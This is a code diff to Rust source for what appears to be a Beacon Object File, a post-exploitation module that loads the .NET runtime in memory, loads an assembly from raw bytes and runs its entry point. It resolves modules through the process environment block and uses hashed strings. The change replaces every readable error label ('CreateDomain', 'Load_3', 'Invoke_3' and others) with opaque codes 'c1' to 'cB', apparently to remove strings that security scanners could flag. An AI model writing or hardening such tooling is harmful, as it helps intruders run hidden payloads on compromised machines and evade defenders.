@@ -24,7 +24,7 @@ pub unsafe fn start(info: &AsmInfo) -> Result<ComPtr<ICorRuntimeHost>, BofError>
         ClrVersion::V4 => V4_VERSION,
         ClrVersion::V2 => V2_VERSION,
     };
-    unsafe { start_clr(version).map_err(|hr| BofError::Clr { hr, op: "start_clr" }) }
+    unsafe { start_clr(version).map_err(|hr| BofError::Clr { hr, op: "c1" }) }
 }
 
 pub unsafe fn create_domain(
@@ -43,7 +43,7 @@ pub unsafe fn create_domain(
             &mut domain_unk,
         );
         if hr < 0 {
-            return Err(BofError::Clr { hr, op: "CreateDomain" });
+            return Err(BofError::Clr { hr, op: "c2" });
         }
         let mut domain: *mut c_void = core::ptr::null_mut();
         let unk = domain_unk as *mut IUnknown;
@@ -54,10 +54,10 @@ pub unsafe fn create_domain(
         );
         ((*(*unk).vtbl).release)(unk as *mut c_void);
         if hr < 0 {
-            return Err(BofError::Clr { hr, op: "QI AppDomain" });
+            return Err(BofError::Clr { hr, op: "c3" });
         }
         ComPtr::<AppDomain>::from_raw(domain as *mut _)
-            .ok_or(BofError::Clr { hr: -1, op: "ComPtr AppDomain" })
+            .ok_or(BofError::Clr { hr: -1, op: "c4" })
     }
 }
 
@@ -67,17 +67,17 @@ pub unsafe fn load_assembly(
 ) -> Result<ComPtr<Assembly>, BofError> {
     unsafe {
         let sa = OwnedSafeArray::create(VT_UI1, asm.len() as u32)
-            .ok_or(BofError::Clr { hr: -1, op: "SafeArrayCreate" })?;
+            .ok_or(BofError::Clr { hr: -1, op: "c5" })?;
         let pv = (*sa.ptr).pvData;
         core::ptr::copy_nonoverlapping(asm.as_ptr(), pv as *mut u8, asm.len());
         let d = domain.as_raw();
         let mut asm_ptr: *mut c_void = core::ptr::null_mut();
         let hr = ((*(*d).vtbl).load_3)(d as *mut c_void, sa.ptr, &mut asm_ptr);
         if hr < 0 {
-            return Err(BofError::Clr { hr, op: "Load_3" });
+            return Err(BofError::Clr { hr, op: "c6" });
         }
         ComPtr::<Assembly>::from_raw(asm_ptr as *mut _)
-            .ok_or(BofError::Clr { hr: -1, op: "ComPtr Assembly" })
+            .ok_or(BofError::Clr { hr: -1, op: "c7" })
     }
 }
 
@@ -91,15 +91,15 @@ pub unsafe fn invoke(
         let mut mi_ptr: *mut c_void = core::ptr::null_mut();
         let hr = ((*(*a).vtbl).entry_point)(a as *mut c_void, &mut mi_ptr);
         if hr < 0 {
-            return Err(BofError::Clr { hr, op: "EntryPoint" });
+            return Err(BofError::Clr { hr, op: "c8" });
         }
         let mi = mi_ptr as *mut MethodInfo;
 
         let tokens: Vec<&str> = args_str.split_whitespace().collect();
         let args_sa = OwnedSafeArray::create(VT_VARIANT, 1)
-            .ok_or(BofError::Clr { hr: -1, op: "args SafeArray" })?;
+            .ok_or(BofError::Clr { hr: -1, op: "c9" })?;
         let bstr_array = OwnedSafeArray::create(VT_BSTR, tokens.len() as u32)
-            .ok_or(BofError::Clr { hr: -1, op: "BSTR SafeArray" })?;
+            .ok_or(BofError::Clr { hr: -1, op: "cA" })?;
 
         if let Some(oleaut) =
             opsec_peb::resolve_module(opsec_strcrypt::hash!("oleaut32.dll"))
@@ -139,7 +139,7 @@ pub unsafe fn invoke(
         let obj: Variant = core::mem::zeroed();
         let hr = ((*(*mi).vtbl).invoke_3)(mi as *mut c_void, obj, args_sa.ptr, &mut retval);
         if hr < 0 {
-            return Err(BofError::Clr { hr, op: "Invoke_3" });
+            return Err(BofError::Clr { hr, op: "cB" });
         }
         Ok(())
     }
